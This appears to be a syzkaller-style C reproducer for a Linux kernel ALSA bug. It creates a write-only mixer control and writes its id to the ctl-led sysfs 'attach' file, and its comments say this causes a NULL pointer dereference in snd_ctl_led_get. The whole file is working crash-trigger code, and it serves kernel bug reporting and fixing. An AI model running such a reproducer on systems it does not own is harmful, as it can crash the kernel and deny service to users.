// https://syzkaller.appspot.com/bug?id=02f5af3abbe5e5a014ee9001d4a2f587b122f1eb
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>

#define SNDRV_CTL_IOCTL_ELEM_ADD	_IOWR('U', 0x17, struct snd_ctl_elem_info)
#define SNDRV_CTL_ELEM_IFACE_MIXER	2
#define SNDRV_CTL_ELEM_TYPE_BOOLEAN	1
#define SNDRV_CTL_ELEM_ACCESS_WRITE	(1<<1)

struct snd_ctl_elem_id {
	unsigned int numid;
	int iface;
	unsigned int device;
	unsigned int subdevice;
	unsigned char name[44];
	unsigned int index;
};

struct snd_ctl_elem_info {
	struct snd_ctl_elem_id id;
	int type;
	unsigned int access;
	unsigned int count;
	int owner;
	union {
		struct {
			long min;
			long max;
			long step;
		} integer;
		struct {
			long long min;
			long long max;
			long long step;
		} integer64;
		struct {
			unsigned int items;
			unsigned int item;
			char name[64];
			unsigned long long names_ptr;
			unsigned int names_length;
		} enumerated;
		unsigned char reserved[128];
	} value;
	unsigned char reserved[64];
};

int main(void)
{
	int fd = -1;
	char dev_name[64];
	int card_num = -1;
	
	/* 1. Find an available ALSA control device */
	for (int i = 0; i < 32; i++) {
		snprintf(dev_name, sizeof(dev_name), "/dev/snd/controlC%d", i);
		fd = open(dev_name, O_RDWR);
		if (fd >= 0) {
			card_num = i;
			break;
		}
	}
	
	if (fd < 0) {
		printf("[-] Failed to open any /dev/snd/controlC* device: %s\n", strerror(errno));
		exit(1);
	}
	printf("[+] open %s successful.\n", dev_name);

	struct snd_ctl_elem_info info;
	memset(&info, 0, sizeof(info));
	info.id.iface = SNDRV_CTL_ELEM_IFACE_MIXER;
	strcpy((char *)info.id.name, "BuggyControl");
	info.type = SNDRV_CTL_ELEM_TYPE_BOOLEAN;
	
	/* 2. Create a write-only control, so kctl->get remains NULL */
	info.access = SNDRV_CTL_ELEM_ACCESS_WRITE;
	info.count = 1;

	int res = ioctl(fd, SNDRV_CTL_IOCTL_ELEM_ADD, &info);
	if (res < 0) {
		printf("[-] Failed to ioctl SNDRV_CTL_IOCTL_ELEM_ADD: %s\n", strerror(errno));
		close(fd);
		exit(1);
	}
	printf("[+] ioctl SNDRV_CTL_IOCTL_ELEM_ADD successful. numid=%u\n", info.id.numid);

	char sysfs_path[128];
	snprintf(sysfs_path, sizeof(sysfs_path), 
		 "/sys/class/sound/ctl-led/speaker/card%d/attach", card_num);
	
	int sysfs_fd = open(sysfs_path, O_WRONLY);
	if (sysfs_fd < 0) {
		printf("[-] Failed to open sysfs attach file %s: %s\n", sysfs_path, strerror(errno));
		close(fd);
		exit(1);
	}
	printf("[+] open %s successful.\n", sysfs_path);

	char buf[64];
	/* 3. Write the numid of the newly created control to the attach file.
	 * This triggers snd_ctl_led_set_id -> snd_ctl_led_get -> NULL pointer dereference.
	 */
	snprintf(buf, sizeof(buf), "%u", info.id.numid);
	res = write(sysfs_fd, buf, strlen(buf));
	if (res < 0) {
		printf("[-] Failed to write to sysfs: %s\n", strerror(errno));
		close(sysfs_fd);
		close(fd);
		exit(1);
	}
	printf("[+] write to sysfs successful.\n");

	close(sysfs_fd);
	close(fd);
	return 0;
}